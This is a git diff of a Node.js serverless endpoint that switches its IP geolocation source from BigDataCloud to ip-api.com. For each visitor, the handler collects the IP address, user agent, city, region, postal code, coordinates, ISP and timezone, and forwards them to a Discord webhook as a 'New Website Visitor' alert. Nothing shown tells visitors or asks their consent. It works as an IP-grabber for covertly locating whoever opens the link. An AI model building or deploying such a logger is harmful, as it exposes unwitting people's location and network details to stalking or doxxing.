@@ -1,3 +1,4 @@
+// Use node-fetch v2 (CommonJS)
 const fetch = require('node-fetch');
 
 module.exports = async (req, res) => {
@@ -6,203 +7,136 @@ module.exports = async (req, res) => {
   res.setHeader('Access-Control-Allow-Methods', 'GET, OPTIONS');
   res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
 
-  // Handle preflight requests
   if (req.method === 'OPTIONS') {
     return res.status(200).end();
   }
 
   try {
-    // Get client IP - handle multiple IPs in x-forwarded-for
+    // Get client IP
     let clientIP = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
-    
-    // Clean the IP address
     if (clientIP.includes(',')) {
       clientIP = clientIP.split(',')[0].trim();
     }
-    
-    // Remove IPv6 prefix if present
     clientIP = clientIP.replace(/^::ffff:/, '');
+    
+    const userAgent = req.headers['user-agent'] || 'Unknown';
     
     console.log('Client IP:', clientIP);
     
-    const userAgent = req.headers['user-agent'];
-    const apiKey = process.env.BIGDATACLOUD_API_KEY || 'demo';
-    
-    console.log('Using API Key:', apiKey === 'demo' ? 'demo key' : 'custom key');
-    
-    // BigDataCloud API call with better error handling
-    let ipInfo = {};
-    let timezoneInfo = {};
-    
+    // Get IP information
+    let ipData = {};
     try {
-      const ipInfoResponse = await fetch(
-        `https://api.bigdatacloud.net/data/client-ip`,
-        {
-          headers: {
-            'Accept': 'application/json',
-          }
-        }
-      );
-      
-      console.log('IP API Status:', ipInfoResponse.status);
-      
-      // Check if response is JSON
-      const contentType = ipInfoResponse.headers.get('content-type');
-      if (!contentType || !contentType.includes('application/json')) {
-        const textResponse = await ipInfoResponse.text();
-        console.log('Non-JSON response from IP API:', textResponse.substring(0, 200));
-        throw new Error('BigDataCloud IP API returned non-JSON response');
+      const response = await fetch(`http://ip-api.com/json/${clientIP}?fields=66842623`);
+      if (response.ok) {
+        ipData = await response.json();
       }
-      
-      const ipData = await ipInfoResponse.json();
-      console.log('IP Data received');
-      
-      // Now get geolocation using the IP
-      const geoResponse = await fetch(
-        `https://api.bigdatacloud.net/data/ip-geolocation?key=${apiKey}&ip=${clientIP}&localityLanguage=en`,
-        {
-          headers: {
-            'Accept': 'application/json',
-          }
-        }
-      );
-      
-      console.log('Geo API Status:', geoResponse.status);
-      
-      if (!geoResponse.ok) {
-        const errorText = await geoResponse.text();
-        console.log('Geo API Error:', errorText);
-        throw new Error(`Geo API failed: ${geoResponse.status}`);
-      }
-      
-      const geoContentType = geoResponse.headers.get('content-type');
-      if (!geoContentType || !geoContentType.includes('application/json')) {
-        const textResponse = await geoResponse.text();
-        console.log('Non-JSON response from Geo API:', textResponse.substring(0, 200));
-        throw new Error('BigDataCloud Geo API returned non-JSON response');
-      }
-      
-      ipInfo = await geoResponse.json();
-      
-      // Get timezone information
-      if (ipInfo.location && ipInfo.location.latitude) {
-        const timezoneResponse = await fetch(
-          `https://api.bigdatacloud.net/data/timezone-by-location?latitude=${ipInfo.location.latitude}&longitude=${ipInfo.location.longitude}&key=${apiKey}&localityLanguage=en`
-        );
-        
-        if (timezoneResponse.ok) {
-          timezoneInfo = await timezoneResponse.json();
-        }
-      }
-      
-    } catch (apiError) {
-      console.error('API Error:', apiError.message);
-      // Fallback to simple IP detection
-      ipInfo = {
-        ip: clientIP,
-        location: {
-          city: 'Unknown',
-          region: 'Unknown',
-          country: { name: 'Unknown' },
-          latitude: 0,
-          longitude: 0,
-          postalCode: 'Unknown'
-        },
-        network: {
-          carrier: { name: 'Unknown' },
-          organisation: 'Unknown'
-        },
-        country: {
-          name: 'Unknown',
-          code: 'Unknown'
-        }
-      };
-      
-      timezoneInfo = {
-        timeZoneName: 'Unknown',
-        gmtOffsetString: 'Unknown'
+    } catch (error) {
+      console.log('Using fallback IP detection');
+      ipData = {
+        query: clientIP,
+        status: 'success',
+        country: 'Unknown',
+        countryCode: 'XX',
+        region: 'Unknown',
+        regionName: 'Unknown',
+        city: 'Unknown',
+        zip: 'Unknown',
+        lat: 0,
+        lon: 0,
+        timezone: 'UTC',
+        isp: 'Unknown',
+        org: 'Unknown',
+        as: 'Unknown'
       };
     }
-
-    // Prepare Discord embed
+    
+    // Prepare Discord message
     const discordEmbed = {
       embeds: [{
-        title: "🌐 New Visitor Information",
+        title: "🌐 New Website Visitor",
         color: 0x00ff00,
         fields: [
           {
             name: "IP Address",
-            value: `\`\`\`${clientIP}\`\`\``,
-            inline: false
+            value: `\`${clientIP}\``,
+            inline: true
           },
           {
             name: "Location",
-            value: `**Country:** ${ipInfo.country?.name || 'Unknown'}\n**Region:** ${ipInfo.location?.region || 'Unknown'}\n**City:** ${ipInfo.location?.city || 'Unknown'}\n**Postal Code:** ${ipInfo.location?.postalCode || 'Unknown'}`,
+            value: `${ipData.city || 'Unknown'}, ${ipData.regionName || 'Unknown'}, ${ipData.country || 'Unknown'}`,
             inline: true
           },
           {
             name: "Coordinates",
-            value: `**Lat:** ${ipInfo.location?.latitude || 'Unknown'}\n**Long:** ${ipInfo.location?.longitude || 'Unknown'}`,
+            value: `${ipData.lat || 0}, ${ipData.lon || 0}`,
             inline: true
           },
           {
-            name: "Network",
-            value: `**ISP:** ${ipInfo.network?.carrier?.name || 'Unknown'}\n**Organization:** ${ipInfo.network?.organisation || 'Unknown'}`,
+            name: "ISP",
+            value: ipData.isp || 'Unknown',
             inline: true
           },
           {
             name: "Timezone",
-            value: `**Name:** ${timezoneInfo.timeZoneName || 'Unknown'}\n**Offset:** ${timezoneInfo.gmtOffsetString || 'Unknown'}`,
+            value: ipData.timezone || 'UTC',
             inline: true
           },
           {
-            name: "Device Info",
-            value: `**User Agent:** \`${userAgent?.substring(0, 100) || 'Unknown'}${userAgent?.length > 100 ? '...' : ''}\``,
+            name: "User Agent",
+            value: `\`\`\`${userAgent.substring(0, 100)}${userAgent.length > 100 ? '...' : ''}\`\`\``,
             inline: false
           }
         ],
         footer: {
-          text: `Logged at ${new Date().toISOString()}`
+          text: `Logged at ${new Date().toLocaleString()}`
         }
       }]
     };
-
-    // Send to Discord webhook (optional)
+    
+    // Send to Discord if webhook is configured
     if (process.env.DISCORD_WEBHOOK_URL) {
       try {
         await fetch(process.env.DISCORD_WEBHOOK_URL, {
           method: 'POST',
-          headers: {
-            'Content-Type': 'application/json',
-          },
+          headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify(discordEmbed)
         });
-        console.log('Discord webhook sent successfully');
-      } catch (discordError) {
-        console.error('Discord webhook error:', discordError.message);
+      } catch (e) {
+        console.log('Note: Discord webhook failed (might not be configured)');
       }
     }
-
-    // Return data to client
+    
+    // Return response
     res.status(200).json({
       success: true,
-      message: "Information logged successfully",
+      message: "IP information logged",
       data: {
         ip: clientIP,
-        location: ipInfo.location || {},
-        country: ipInfo.country || {},
-        network: ipInfo.network || {},
-        timezone: timezoneInfo,
+        location: {
+          city: ipData.city,
+          region: ipData.regionName,
+          country: ipData.country,
+          countryCode: ipData.countryCode,
+          coordinates: {
+            latitude: ipData.lat,
+            longitude: ipData.lon
+          },
+          zip: ipData.zip
+        },
+        network: {
+          isp: ipData.isp,
+          organization: ipData.org
+        },
+        timezone: ipData.timezone,
         userAgent: userAgent
       }
     });
-
+    
   } catch (error) {
-    console.error('Server Error:', error);
-    res.status(500).json({
+    console.error('Error:', error);
+    res.status(200).json({
       success: false,
-      error: error.message,
-      stack: process.env.NODE_ENV === 'development' ? error.stack : undefined
+      error: error.message
     });
   }
 };
